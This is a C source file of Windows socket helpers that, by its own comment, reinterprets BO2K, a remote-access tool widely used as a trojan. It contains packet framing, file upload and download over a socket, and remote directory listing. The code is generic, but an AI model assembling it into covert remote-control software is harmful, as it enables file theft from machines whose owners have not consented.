//#include "stdafx.h"								//pf_ziminski  [2003]
#include "zsockets.h"
#include <malloc.h>

// BO2K in dEmon interpretation
int recvpkt(LPBUFFSOCKET lpBSocket)
{
	int ret;
	fd_set readfds;
	TIMEVAL tv;
	unsigned long pktlen;

	tv.tv_sec = 0;
	tv.tv_usec = 0;
	FD_ZERO(&readfds);
	FD_SET(lpBSocket->s, &readfds);

	// check: is new packet?
	if(	(lpBSocket->pBuffer == NULL) ||
		(lpBSocket->nPktLen == 0) ||
		(lpBSocket->nPktLen == lpBSocket->nBufFill))
	{
		ret = select(0, &readfds, NULL, NULL, &tv);
		if(ret <= 0)
		{
			return ret;
		}

		/*
		ret = recv(s, (char *) &pktlen, sizeof(unsigned long), MSG_PEEK);
		if(ret == SOCKET_ERROR)
		{
			return SOCKET_ERROR;
		}
		if(ret < sizeof(unsigned long))
		{
			return 0;
		}
		*/

		if(ioctlsocket(lpBSocket->s, FIONREAD, &pktlen) == SOCKET_ERROR)
		{
			return SOCKET_ERROR;
		}

		if(pktlen < sizeof(unsigned long))
		{
			return 0;
		}

		ret = recv(lpBSocket->s, (char *) &pktlen, sizeof(unsigned long), 0);
		if(ret == SOCKET_ERROR)
		{
			return SOCKET_ERROR;
		}
		if(ret != sizeof(unsigned long))
		{
			return 0;
		}

		if(lpBSocket->pBuffer)
		{
			free(lpBSocket->pBuffer);
			lpBSocket->nPktLen = 0;
			lpBSocket->nBufFill = 0;
		}

		if((pktlen <= 0) || (pktlen > 0xFFFF))
		{
			return SOCKET_ERROR;
		}

		lpBSocket->pBuffer = (char *) malloc(pktlen);
		if(lpBSocket->pBuffer == NULL)
		{
			return SOCKET_ERROR;
		}

		lpBSocket->nPktLen = pktlen;
		lpBSocket->nBufFill = 0;
	}

	tv.tv_sec = 5;
	tv.tv_usec = 0;
	do {
		ret = select(0, &readfds, NULL, NULL, &tv);
		if(ret <= 0)
		{
			return ret;
		}

		if(ioctlsocket(lpBSocket->s, FIONREAD, &pktlen) == SOCKET_ERROR)
		{
			return SOCKET_ERROR;
		}
		if(pktlen == 0)
		{
			return 0;
		}

		// иначе может быть buffer overflow
		if(pktlen >lpBSocket->nPktLen-lpBSocket->nBufFill)
		{
			pktlen = lpBSocket->nPktLen-lpBSocket->nBufFill;
		}

		ret = recv(	lpBSocket->s, lpBSocket->pBuffer+lpBSocket->nBufFill, pktlen, 0);
		if(ret == SOCKET_ERROR)
		{
			return SOCKET_ERROR;
		}
		lpBSocket->nBufFill += ret;
	} while(lpBSocket->nBufFill < lpBSocket->nPktLen);

	//return abs((int)lpBSocket->nBufFill);
	return 1;
}

// посылает пакет, если большой то посылает его частями
// прерывает посылку после долгого ожидания готовности
// сокета с ошибкой 0.
// Return Values:
// >0 - данные отправлены
// =0 - данные не отправлены по причине не готовности сокета
//      или же невозможно распределить память под пакет или
//      пакет больше установленного размера
// <0 - посылка прервана по причине ошибки сокета
int sendpkt(SOCKET s, char *pData, unsigned long nDataLen)
{
	int ret;
	int count;
	char *ppkt;
	unsigned int mxsize;
	TIMEVAL tv;
	fd_set wfds;

	if((nDataLen <= 0) || (nDataLen > 0xFFFF))
	{
		return 0;
	}

	char *pkt = (char *) malloc(sizeof(unsigned long)+nDataLen);
	if(pkt == NULL) 
	{
		return 0;
	}

	// Send packet length
	memcpy(pkt,&nDataLen,sizeof(unsigned long));
	memcpy((BYTE *)pkt+sizeof(unsigned long),pData,nDataLen);

	count = sizeof(unsigned int);
	if(getsockopt(s, SOL_SOCKET, SO_MAX_MSG_SIZE, (char *) &mxsize, &count) == SOCKET_ERROR)
	{
		free(pkt);
		return SOCKET_ERROR;
	}
	// Send packet
	FD_ZERO(&wfds);
	FD_SET(s,&wfds);
	tv.tv_sec = 5;
	tv.tv_usec = 0;
	ppkt = (char *)pkt;
	count = nDataLen+sizeof(unsigned long);
	do {
		ret = select(0,NULL,&wfds,NULL,&tv);
		if(ret <= 0)
		{
			break;
		}

		ret = send(s, ppkt, (unsigned int)count>mxsize?mxsize:count, 0);
		if(ret == SOCKET_ERROR)
		{
			break;
		}

		count -= ret;
		ppkt += ret;
	} while(count>0);
	free(pkt);

	return ret<=0?ret:1;
}

void free_packet(LPBUFFSOCKET lpBSocket)
{
	if(lpBSocket->pBuffer)
	{
		free(lpBSocket->pBuffer);
		lpBSocket->pBuffer = NULL;
	}
	lpBSocket->nPktLen = 0;
	lpBSocket->nBufFill = 0;
	lpBSocket->s = INVALID_SOCKET;
}

int recv_file(SOCKET sock, const char *lpszSaveAs, DWORD dwFileSize, CBSOCKETSFUNC pSocketsFunc)
{
	HANDLE hFile;

	if(pSocketsFunc) pSocketsFunc(0);

	hFile=CreateFile(lpszSaveAs,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		int nBytes;
		DWORD dwCount;
		char svBuffer[1024];
		DWORD dwReceived;

		dwReceived = 0;

		do {
			// Give up time
			Sleep(20);

			nBytes=recv(sock,svBuffer,1024,0);
			if(nBytes>0)
			{
				if(!WriteFile(hFile,svBuffer,nBytes,&dwCount,NULL)) break;
				if(dwCount != (unsigned)nBytes) break;
				dwReceived += dwCount;
			}

			if(pSocketsFunc && !pSocketsFunc(dwReceived*100/dwFileSize)) break;
		} 
		while(nBytes >0);

		CloseHandle(hFile);
	}

	if(pSocketsFunc) pSocketsFunc(100);

	return 0;
}

int send_file(SOCKET sock, const char *lpszFileName, CBSOCKETSFUNC pSocketsFunc)
{
	char svBuffer[1024];
	HANDLE hInFile;
	DWORD dwFileSize;

	if(pSocketsFunc) pSocketsFunc(0);

	hInFile=CreateFile(lpszFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
	if(hInFile != INVALID_HANDLE_VALUE)
	{
		dwFileSize = GetFileSize(hInFile, NULL);

		DWORD dwBytes;
		DWORD dwReceived;

		dwReceived = 0;
		do
		{
			if(!ReadFile(hInFile,svBuffer,1024,&dwBytes,NULL)) break;
			if(send(sock,svBuffer,dwBytes,0)<=0) break;
			dwReceived += dwBytes;
			if(pSocketsFunc && !pSocketsFunc(dwReceived*100/dwFileSize)) break;
		}
		while(dwBytes==1024);

		CloseHandle(hInFile);

	}

	if(pSocketsFunc) pSocketsFunc(100);

	return 0;
}

int send_list(SOCKET sock, const char *lpszDirWildcard)
{
	char svBuffer[1024];
	HANDLE hFind;
	WIN32_FIND_DATA finddata;
	int nCount;
	DWORD dwBytes;

	wsprintf(svBuffer,";Contents of directory '%s':\n", lpszDirWildcard );
	if(send(sock, svBuffer, strlen(svBuffer), 0) == SOCKET_ERROR)
	{
		return -1;
	}

	hFind = FindFirstFile(lpszDirWildcard, &finddata);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	nCount=0;
	dwBytes=0;
	do
	{
		FILETIME filetime;
		SYSTEMTIME systemtime;

		FileTimeToLocalFileTime(&finddata.ftLastWriteTime, &filetime);
		FileTimeToSystemTime(&filetime, &systemtime);

		wsprintf (
			svBuffer,
			"%12s  %8d %c%c%c%c%c%c%c %2.2d-%2.2d-%4.4d %2.2d:%2.2d %.260s\n",
			finddata.cAlternateFileName,
			finddata.nFileSizeLow,
			finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY	?'D':'-',
			finddata.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE		?'A':'-',
			finddata.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN		?'H':'-',
			finddata.dwFileAttributes & FILE_ATTRIBUTE_COMPRESSED	?'C':'-',
			finddata.dwFileAttributes & FILE_ATTRIBUTE_READONLY		?'R':'-',
			finddata.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM		?'S':'-',
			finddata.dwFileAttributes & FILE_ATTRIBUTE_TEMPORARY	?'T':'-',
			(int)systemtime.wDay,
			(int)systemtime.wMonth,
			(int)systemtime.wYear,
			(int)systemtime.wHour%24,
			(int)systemtime.wMinute%60,
			finddata.cFileName );
		
		if(send(sock, svBuffer, strlen(svBuffer), 0) == SOCKET_ERROR)
		{
			FindClose(hFind);
			return -1;
		}

		nCount++;
		dwBytes+=finddata.nFileSizeLow;
	}
	while(FindNextFile(hFind, &finddata));

	FindClose(hFind);

	wsprintf(svBuffer, ";%lu bytes in %ld files.", dwBytes, nCount);
	if(send(sock, svBuffer, strlen(svBuffer)+1, 0) == SOCKET_ERROR)
	{
		return -1;
	}

	return 0;
}

int recv_list()
{
	return -1;
}

void free_list()
{
}